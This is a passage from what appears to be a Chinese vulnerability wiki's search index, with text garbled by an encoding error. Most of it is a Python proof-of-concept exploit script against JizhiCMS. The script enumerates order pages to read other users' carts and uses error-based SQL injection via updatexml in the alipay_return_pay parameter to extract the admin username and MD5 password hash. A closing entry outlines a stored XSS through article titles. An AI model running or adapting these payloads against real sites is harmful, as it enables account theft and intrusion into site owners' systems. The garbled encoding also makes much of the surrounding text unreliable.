htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); å‘å¸ƒæ—¶é—´ 2020-05-25]') else: print('å¾—åˆ°çš„æ•°æ®ä¸º:\\n', data) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> ç”¨æˆ·è´­ç‰©è½¦é¡µé¢è·å– (Home/c/UserController.php [orderdetails]) ## æ¼æ´ç‚¹ ---> æ— ç”¨æˆ·cookie id çš„éªŒè¯ ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.8ä»¥ä¸‹å…¨ç‰ˆæœ¬ (å½“å‰æœ€æ–° v1.8 æ›´æ–°æ—¶é—´:6æœˆ30æ—¥) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //è¶…æ—¶æˆ–è€…å·²æ”¯ä»˜ if($order['isshow']==0){ $msg = 'è®¢å•å·²åˆ é™¤'; } if($order['isshow']==3){ $msg = 'è®¢å•å·²è¿‡æœŸï¼Œä¸å¯æ”¯ä»˜ï¼'; } if($order['isshow']==2){ $msg = 'è®¢å•å·²æ”¯ä»˜ï¼Œè¯·å‹¿é‡å¤æ“ä½œï¼'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //å…¼å®¹å¤šæ¨¡å—åŒ– if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) year_day = str(input(\"è¾“å…¥æ—¥æœŸ(ä¾‹å¦‚:20200712):\")) shop = [] # éå†æ‰€æœ‰å‡ºç°çš„ç”¨æˆ·è´­ç‰©è½¦é¡µé¢ for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # æ‰“å°ç»“æœ if 'æ€»é‡‘é¢' in response.text: print('è´­ç‰©è½¦é¡µé¢ï¼š',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> å¾—åˆ°è´¦å·å¯†ç  ( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ ---> æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ try: exploit_url = str(input(\"æ”»å‡»ç½‘ç«™urlï¼š\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # ç”¨æˆ·å + å¯†ç  é•¿åº¦ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # å¾—åˆ°è´¦å·å¯†ç ï¼Œå¯†ç md5æ ¼å¼ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # åˆ†å‰²è´¦å·å¯†ç  admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"æˆåŠŸå¾—åˆ°è´¦å·å¯†ç ï¼š\\n\" \"ç”¨æˆ·å:\",admin, \"\\nå¯†ç (md5):\",passwd) print('------------------ peiqi -----------------------') except: print('å‡ºç°é”™è¯¯') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() è´­ç‰©è½¦çˆ†ç ´æ²¡æœ‰åˆ©ç”¨ç‚¹ï¼Œå…³äºå®¡è®¡éƒ¨åˆ†å‚è€ƒæè‡´CMSå®¡è®¡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 14:33:19 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS.html","title":"æè‡´CMS <1.81 ç‰ˆæœ¬ å­˜å‚¨å‹XSS","keywords":"","body":"æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS æ¼æ´å¤ç° ç™»å½•ç®¡ç†å‘˜æ·»åŠ æ¨¡å— æ³¨å†Œç”¨æˆ· ç‚¹å‡»å‘å¸ƒæ–‡ç«  åœ¨æ–‡ç« æ ‡é¢˜å¤„æ’å…¥xss payload å½“ç®¡ç†å‘˜è®¿é—®æ—¶XSSæˆåŠŸ å‚è€ƒ æè‡´CMSä»£ç å®¡è®¡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 14:28:26 "}}